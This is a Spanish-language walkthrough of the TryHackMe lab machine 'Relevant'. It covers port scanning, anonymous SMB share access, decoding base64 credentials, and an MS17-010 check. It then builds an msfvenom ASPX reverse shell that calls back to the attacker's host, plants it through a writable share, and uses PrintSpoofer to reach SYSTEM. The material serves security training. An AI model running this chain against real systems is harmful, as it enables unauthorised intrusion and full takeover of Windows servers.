# 🎯 Write-up: Relevant (TryHackMe)

## 📝 Introducción: El Desafío

Este write-up documenta el proceso de hacking ético realizado sobre la máquina Relevant de TryHackMe. El escenario simula una auditoría de seguridad de caja negra (black box penetration test) a petición de un cliente que planea lanzar el entorno a producción en siete días.

🛡️ Alcance del Pentest

El objetivo principal es evaluar la postura de seguridad de la máquina asignada (IP Máquina) y conseguir dos flags como prueba de explotación: user.txt y root.txt.
````
Requerimiento,Descripción

Tipo de Prueba,Caja Negra (Black Box). Información mínima provista.

Objetivo,IP asignada a la máquina (10.10.137.195).

Pruebas de Explotación,Se requiere obtener user.txt y root.txt.

Metodología,"Se permite cualquier herramienta, pero se prioriza la explotación manual inicialmente."

Reporte Adicional,Se deben encontrar y reportar TODAS las vulnerabilidades (existe más de una ruta para obtener root).
````
Con esta información y el objetivo claro de simular un atacante externo, comenzamos la fase de reconocimiento para perfilar el sistema.

## ✅ Paso 1: Reconocimiento Inicial (Ping)

El primer paso en cualquier CTF es confirmar la conectividad con la máquina objetivo y verificar que esté activa. Utilizamos la herramienta ping para enviar paquetes ICMP y medir el tiempo de respuesta.

Objetivo: Verificar que el host 10.10.137.195 está en línea.

Para esto, ejecutamos el comando ping con el parámetro -c 4 para limitar el número de paquetes a cuatro.

<img width="683" height="286" alt="Ping" src="https://github.com/user-attachments/assets/e440ba38-0105-414c-aee5-79c69516c49f" />

💻 Comando
````
Bash

ping -c 4 10.10.137.195
````

📊 Resultado

El resultado muestra una respuesta exitosa, lo que confirma que la máquina objetivo está activa y lista para la siguiente fase de enumeración.

El 0% packet loss y los tiempos de respuesta indican que la máquina está accesible.

## 🔎 Paso 2: Escaneo de Puertos (Nmap)

Tras verificar la conectividad, el siguiente paso es realizar una enumeración exhaustiva de puertos para identificar los servicios activos en el host objetivo.

Objetivo: Descubrir puertos abiertos, los servicios que se ejecutan, sus versiones y obtener información del sistema operativo (SO).

Utilizamos la herramienta Nmap con la siguiente configuración:

<img width="864" height="820" alt="Nmap" src="https://github.com/user-attachments/assets/ddd3712d-75fd-4fdd-add4-c5a054cb0380" />

💻 Comando
````
nmap -p- -sV -sC 10.10.137.195
````

````
Opción,Descripción

-p-,Escanea todos los 65535 puertos TCP.

-sV,Determina la versión de los servicios que se ejecutan.

-sC,Ejecuta los scripts por defecto de Nmap para una enumeración básica.
````

📊 Resultado Detallado del EscaneoEl escaneo de Nmap confirmó que la máquina es un servidor Windows y reveló la presencia de los siguientes puertos abiertos:

````
Puerto Estado Servicio Versión

80/tcp open http Microsoft IIS httpd 10.0

135/tcp open msrpc Microsoft Windows RPC

139/tcp open` netbios-ssn** Microsoft Windows netbios-ssn
````

🔑 Información Clave Obtenida

Servicios Web: El servidor Microsoft IIS httpd 10.0 se ejecuta en dos puertos diferentes (80 y 49663). Ambos servidores tienen un título web de Relevant.

Vulnerabilidad Potencial: Nmap detecta que la cabecera http-methods incluye TRACE, lo que sugiere la posibilidad de un ataque de Cross-Site Tracing (XST), aunque no es el camino principal.

Sistema Operativo (SO): El puerto 445 (SMB) y los scripts de Nmap identifican el SO como Windows Server 2016 Standard Evaluation (Build 14393).

Servicios Windows: Puertos clave de Windows como RDP (3389) y SMB (445) están activos, abriendo posibles vías de enumeración de usuarios y recursos compartidos.

Seguridad SMB: El script smb-security-mode muestra que la firma de mensajes (Message signing) está disabled (dangerous, but default), un factor a considerar si se falla la explotación web.

## 2.1 🛠️ Corroboración con Herramienta Custom (port-scanner-kik3)

Para garantizar la integridad de nuestros hallazgos y validar los resultados del escaneo exhaustivo de Nmap, se ejecuta un escaneo de puertos secundario utilizando una herramienta desarrollada en Python (port-scanner-kik3).

Objetivo: Confirmar la lista de puertos abiertos y obtener un análisis de riesgo preliminar.

<img width="822" height="507" alt="escaneo portscanner" src="https://github.com/user-attachments/assets/c335497e-c580-4c4d-8da5-f3bac83c0338" />


💻 Ejecución de la Herramienta
````
Bash
python3 port-scanner-kik3.py 10.10.137.195
````

## 🌐 Paso 3: Enumeración de Recursos Compartidos (SMB)

Con la confirmación de que el puerto 445 (SMB) está abierto, procedemos a enumerar los recursos compartidos disponibles en la máquina objetivo.

Objetivo: Listar los shares (recursos compartidos) disponibles en el host y explorar su contenido en busca de credenciales o archivos de configuración.

3.1 💻 Listado de Recursos Compartidos con smbclient

Utilizamos la herramienta smbclient para listar los recursos compartidos. Ejecutamos el comando sin especificar un usuario, permitiendo que smbclient intente conectarse como invitado o con las credenciales por defecto de nuestra máquina.

<img width="742" height="425" alt="smbcliente lsitando recursos" src="https://github.com/user-attachments/assets/a93e9112-f805-4eb5-8060-2f656bc5f5fb" />

Comando
````
Bash

smbclient -L \\\\10.10.137.195
````

3.2 📁 Acceso y Exploración del Share nt4wrksv

Dado que el recurso nt4wrksv no es un share administrativo por defecto, decidimos intentar acceder a él. La conexión se estableció sin necesidad de proporcionar credenciales (posiblemente debido a una configuración de acceso de invitado).

Comando
````
Bash

smbclient \\\\10.10.137.195\\nt4wrksv
````

🔍 Archivos Encontrados

Una vez dentro del share, listamos su contenido (ls):

smb: \> ls
  .                              D        0  Sat Jul 25 23:46:04 2020
  ..                             D        0  Sat Jul 25 23:46:04 2020
  passwords.txt                  A       98  Sat Jul 25 17:15:33 2020

Encontramos un archivo sumamente interesante: passwords.txt.

3.3 ⬇️ Descarga del Archivo

Procedemos a descargar el archivo para analizar su contenido:
````
Bash

smb: \> get passwords.txt
````

## 🔓 Paso 4: Análisis de Credenciales y Acceso Fallido

Una vez descargado el archivo passwords.txt del recurso compartido SMB (nt4wrksv), procedemos a analizar su contenido para obtener credenciales válidas.

Objetivo: Descifrar las cadenas codificadas, identificar usuarios y contraseñas, y utilizarlas para intentar obtener acceso.

4.1 🔍 Contenido del Archivo passwords.txt

<img width="445" height="157" alt="contenido archivo password" src="https://github.com/user-attachments/assets/debb32b4-c0d9-46e8-a434-1072e1ae0b07" />

El archivo contenía dos cadenas etiquetadas como [User Passwords - Encoded]:
````
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbcAtIEp1dzRubmFNNG4wMjA2OTY5NjkhJCQk
````

4.2 🔑 Descifrado de Credenciales (Base64)

Las cadenas terminan con == o carecen de caracteres especiales, lo que sugiere una codificación Base64. Utilizamos echo y base64 -d para decodificarlas:

<img width="1160" height="386" alt="descifro claves y usuarios pero no sirven" src="https://github.com/user-attachments/assets/4da22331-4d71-45f3-987d-d12bbf4f4a3e" />

1. Primera Cadena
````
Bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
````
Resultado: Bob - !P@$$w0rD!123

2. Segunda Cadena
````
Bash
echo "QmlsbcAtIEp1dzRubmFNNG4wMjA2OTY5NjkhJCQk" | base64 -d
````
Resultado: Bill - Juw4nnaN4206969!$$

4.3 ❌ Intento Fallido de Acceso Remoto

Intentamos utilizar estas credenciales para obtener un shell en la máquina. Dado que la máquina es Windows, probamos los servicios RDP (3389) y WinRM (Windows Remote Management), que a menudo utiliza el puerto 5985, o puede ser probado a través de la web con Evil-WinRM.

Utilizamos la herramienta Evil-WinRM con las credenciales de Bob:

Comando
````
Bash

evil-winrm -i 10.10.137.195 -u Bob -p '!P@$$w0rD!123'
````
Resultado
````
Evil-WinRM shell v3.7
[...]
Info: Establishing connection to remote endpoint
^C
Warning: Press "y" to exit, press any other key to continue
Info: Exiting...
````

El intento de conexión fue infructuoso, lo que indica que las credenciales de Bob (y probablemente las de Bill) no son válidas para acceder a los servicios remotos en este momento.

Conclusión: Las credenciales encontradas son incorrectas o están desactualizadas.


## 🌐 Paso 5: Exploración Web (Puerto 80)

Tras los fallidos intentos de acceso por SMB y WinRM con las credenciales encontradas (Paso 4), volvemos al vector de ataque más prometedor identificado en el escaneo de Nmap: el servidor web Microsoft IIS 10.0 en los puertos 80 y 49663.

Objetivo: Visitar la página web principal para buscar indicios de aplicaciones o directorios que puedan ser vulnerables.

💻 Acceso al Puerto 80

Navegamos a la dirección IP del objetivo en el puerto HTTP estándar.

<img width="1338" height="678" alt="pagina p80" src="https://github.com/user-attachments/assets/fc64768b-37cf-45b6-8b05-2dd59c7983bf" />

📊 Resultado

La visita al puerto 80 nos muestra la página de bienvenida por defecto de un servidor Internet Information Services (IIS) de Microsoft.

Página por Defecto: Esto indica que no hay una aplicación web específica desplegada en el directorio raíz (/). Es una instalación IIS limpia, lo que limita la enumeración en este puerto a buscar directorios ocultos


## 🚨 Paso 6: Escaneo Específico de Vulnerabilidades (SMB)

Aunque se priorizó la ruta de explotación web, el cliente solicitó reportar TODAS las vulnerabilidades. Por ello, se realiza un escaneo enfocado en el servicio SMB (puertos 139 y 445) utilizando los scripts de Nmap dedicados a la búsqueda de exploits.

Objetivo: Confirmar la existencia de vulnerabilidades explotables en el servicio Microsoft SMBv1.

6.1 💻 Comando de Escaneo

<img width="1015" height="557" alt="escaneo de vulnerabilidades con nmap" src="https://github.com/user-attachments/assets/bbba140c-b19c-46e2-a007-28696f40b520" />


Se utiliza el conjunto de scripts smb-vuln-* de Nmap:
````
nmap --script vuln -p 445,139 10.10.137.195
````

📊 Resultado: Vulnerabilidad Crítica MS17-010El escaneo confirmó la presencia de una vulnerabilidad de alta criticidad en el servicio.
````
Script Resultado

smb-vuln-ms17-010 VULNERABLE
````

El servidor es vulnerable a la vulnerabilidad de ejecución remota de código en servidores Microsoft SMBv1 (MS17-010).

Estado: VULNERABLE

ID: CVE-2017-0143

Factor de Riesgo: HIGH

6.2 📚 Detalle de la Vulnerabilidad (CVE-2017-0143)

Se procede a consultar la vulnerabilidad en bases de datos públicas para entender su alcance.

<img width="1417" height="595" alt="vulenrabilidad detalles" src="https://github.com/user-attachments/assets/2a052b99-048a-4061-899f-a4a5eb3aeeca" />

Conclusión: Se ha identificado una segunda y crítica ruta de acceso a la máquina mediante la explotación del fallo MS17-010.

## 🚀 Paso 7: Creación y Ejecución de Payload ASPX (Acceso Inicial)

La debilidad crítica en la configuración de permisos del recurso compartido SMB (nt4wrksv), combinado con el servidor web IIS 10.0 activo en un puerto no estándar (49663), crea una vía de acceso directa al servidor web.

Objetivo: Generar una reverse shell en formato ASPX, subirla al share de SMB, y ejecutarla a través del puerto web 49663 para obtener una conexión al sistema.

7.1 💻 Creación de la Carga Útil (Payload)

<img width="875" height="129" alt="creo carga util aspx" src="https://github.com/user-attachments/assets/6ccab6d0-f410-495e-b425-06742f1ccca3" />


Utilizamos msfvenom para generar un payload de reverse shell compatible con el entorno Windows (x64) y el servidor IIS.

Comando
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.24.253 LPORT=8080 -f aspx -o exploit.aspx
````

El archivo exploit.aspx fue guardado con un tamaño de 3413 bytes.

7.2 ⬆️ Subida del Exploit al Recurso Compartido

El recurso compartido nt4wrksv no solo permitía el acceso, sino también la escritura, lo que confirmamos al subir el payload directamente usando smbclient.

<img width="813" height="478" alt="subi el exploit al recuros" src="https://github.com/user-attachments/assets/b9b9275d-3ca2-4542-bf90-d23a246879f5" />

Comando
````
Bash

smbclient //10.10.137.195/nt4wrksv
smb: \> put exploit.aspx
````

Una verificación con ls confirma que exploit.aspx reside ahora junto al archivo passwords.txt.

7.3 🎣 Preparación del Listener

Antes de ejecutar el payload, configuramos un oyente (listener) en la máquina atacante utilizando netcat en el puerto especificado (8080) para capturar la reverse shell.

Comando
````
Bash

nc -lvp 8080
````

7.4 💥 Ejecución de la Carga Útil

La clave del éxito reside en que el recurso compartido SMB nt4wrksv está montado como un directorio accesible por el servidor web en el puerto 49663. Al acceder a la URL, el servidor IIS ejecuta el código ASPX.

<img width="1708" height="469" alt="ejecuto exploit a traves de p49663" src="https://github.com/user-attachments/assets/31e31a34-496d-4617-aed8-c4be05cd66c3" />

Acceso Web (Ejecución)

http://10.10.137.195:49663/nt4wrksv/exploit.aspx

🛡️ Acceso Obtenido

Al cargar la URL en el navegador, el código ASPX se ejecuta en el servidor y establece la conexión inversa con nuestro listener.


## 👤 Paso 8: Post-Explotación y Obtención de la Flag de Usuario (user.txt)

Una vez que se establece la reverse shell (Paso 7), el objetivo inmediato es identificar el usuario bajo el que se ejecuta el shell y localizar la primera flag requerida por el cliente, user.txt.

Objetivo: Localizar el directorio del usuario y obtener el contenido de user.txt.

<img width="784" height="600" alt="dentro del user bob obtengo flag user" src="https://github.com/user-attachments/assets/2e589665-9923-4a24-8cba-227ac238cf95" />

8.1 ❓ Identificación del Contexto de Usuario

Al obtener el shell, nos encontramos inicialmente en el directorio c:\windows\system32\inetsrv. El shell está corriendo con permisos de la cuenta del servicio web (probablemente IIS APPPOOL\nt4wrksv), pero necesitamos encontrar la flag en el directorio de un usuario local.

8.2 📁 Búsqueda y Navegación al Directorio de Usuario

Una búsqueda rápida nos lleva al directorio estándar de usuarios de Windows (C:\Users). Al listar el contenido, encontramos el directorio de un usuario llamado Bob.

Comandos de Navegación

Navegar a la raíz de usuarios:
````
Bash

c:\windows\system32\inetsrv> cd C:\Users
````

Entrar al directorio de Bob:
````
Bash

c:\Users> cd Bob
````

Listar contenido de Bob:
````
Bash

c:\Users\Bob> dir
# Se observa el directorio Desktop
````

Navegar al Escritorio:
````
Bash

c:\Users\Bob> cd Desktop
````

8.3 🎉 Obtención de user.txt

Dentro del directorio C:\Users\Bob\Desktop, se lista el contenido y se encuentra el archivo user.txt.

Comandos de Lectura

Listar archivos en Desktop:
````
Bash

c:\Users\Bob\Desktop> dir
# Se observa 'user.txt'
````

Leer el contenido de la flag:
````
Bash

c:\Users\Bob\Desktop> more user.txt
````

🚩 Flag de Usuario Obtenida
````
Flag Requerida Contenido de la Flag
user.txt       THM{...} (Valor ingresado al dashboard)
````

## 👑 Paso 9: Escalada de Privilegios (SeImpersonatePrivilege)

Habiendo obtenido la flag de usuario, el siguiente y último objetivo es escalar privilegios hasta NT AUTHORITY\SYSTEM para acceder a root.txt. El shell actual se ejecuta bajo una cuenta de servicio (IIS APPPOOL\nt4wrksv), por lo que la enumeración de privilegios es crucial.

Objetivo: Identificar un privilegio de usuario explotable para escalar a SYSTEM.

9.1 🔍 Enumeración de Privilegios con whoami /priv

Ejecutamos el comando whoami /priv para listar los privilegios habilitados del usuario actual.

<img width="812" height="281" alt="reviso mis privilegios y puedo escalar meidante exploits" src="https://github.com/user-attachments/assets/0bacd9bc-f95b-4c3c-87f9-cfe3422c5922" />

Comando
````
Bash

whoami /priv
````

📊 Resultado Clave

El resultado revela un privilegio clave con estado Enabled:

````
PRIVILEGES INFORMATION
======================
...
Privilege Name                Description                        State
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...
````

El privilegio SeImpersonatePrivilege (Impersonate a client after authentication) está habilitado.

9.2 🛡️ Identificación del Vector de Explotación

<img width="1323" height="625" alt="info como escalar con que exploit" src="https://github.com/user-attachments/assets/cb5c23ed-293f-4305-ac88-e91e5651734c" />

La presencia del privilegio SeImpersonatePrivilege es un claro indicador de una posible vulnerabilidad conocida como "Token Impersonation".

Este privilegio permite al servicio (en este caso, el proceso de IIS) suplantar el token de seguridad de otro usuario que se ha autenticado en el sistema.

Dos exploits comunes y efectivos para aprovechar este privilegio son:

RottenPotato/JuicyPotato: Aprovechan el servicio BITS y WinRM, respectivamente, para secuestrar el token de SYSTEM.

PrintSpoofer: Explota una debilidad en el servicio Print Spooler para elevar los privilegios.

El material de apoyo proporcionado (Hacking Articles) sugiere un método basado en la vulnerabilidad de suplantación, a menudo explotado por herramientas como PrintSpoofer.


## 👑 Paso 10: Escalada a SYSTEM y Obtención de la Flag Root (root.txt)

Con el privilegio SeImpersonatePrivilege habilitado (Paso 9), procedemos a la fase final de escalada de privilegios utilizando la técnica de suplantación de token a través del exploit PrintSpoofer.

Objetivo: Subir y ejecutar el exploit PrintSpoofer para escalar a NT AUTHORITY\SYSTEM y obtener root.txt.

10.1 📥 Transferencia del Exploit PrintSpoofer

Necesitamos transferir el binario de PrintSpoofer a la máquina objetivo. Utilizamos el mismo recurso compartido SMB (nt4wrksv) que nos dio el acceso inicial, ya que es un directorio con permisos de escritura.

1. Preparación y Descarga
Descargamos la versión precompilada del exploit (e.g., PrintSpoofer64.exe) en la máquina atacante.

2. Subida vía SMB
Utilizamos smbclient para cargar el binario en el share nt4wrksv, que es accesible por el shell actual y el servicio web.

<img width="1724" height="779" alt="descargo el exploit y lo paso al directorio" src="https://github.com/user-attachments/assets/0d1ee6fc-8719-4c96-bcf3-53e5dc505609" />

````
Bash

smbclient //10.10.137.195/nt4wrksv
smb: \> put PrintSpoofer64.exe
# Subiendo PrintSpoofer64.exe en \PrintSpoofer64.exe (115,7 kb/s)
````

10.2 💥 Ejecución del Exploit y Shell de Sistema

Desde el shell de bajo privilegio (que aún se ejecuta como IIS APPPOOL\nt4wrksv), navegamos al directorio nt4wrksv (accesible en C:\inetpub\wwwroot\nt4wrksv en este caso) y ejecutamos PrintSpoofer64.exe.

El exploit utiliza el comando -i -c para iniciar un nuevo proceso de PowerShell con los privilegios del token de SYSTEM.

<img width="856" height="479" alt="ejecuto el exploit obtenfo privilegios y flag root" src="https://github.com/user-attachments/assets/eb20b68b-1c55-4f4e-9090-f025ea2a8586" />


Comando de Ejecución
````
Bash

c:\inetpub\wwwroot\nt4wrksv> .\PrintSpoofer64.exe -i -c powershell.exe
````

🛡️ Confirmación de Escalada

Tras la ejecución exitosa, se inicia el nuevo shell de PowerShell. Verificamos la identidad de la cuenta:

````
PS C:\Windows\system32> whoami
nt authority\system
````

¡Escalada de Privilegios Exitosa! Ahora tenemos control total sobre el sistema como NT AUTHORITY\SYSTEM.

10.3 🎉 Obtención de root.txt

Con privilegios de sistema, navegamos al directorio C:\Users\Administrator para encontrar la flag final.

Comandos de Navegación

Navegar al escritorio del Administrador:
````
Bash

cd C:\Users\Administrator\Desktop
````

Listar archivos:
````
Bash

dir
# Se observa 'root.txt'
````

Leer el contenido de la flag:
````
Bash

more root.txt
````

🚩 Flag de Root Obtenida
````
Flag Requerida Contenido de la Flag
root.txt      THM{...} (Valor ingresado al dashboard)
````
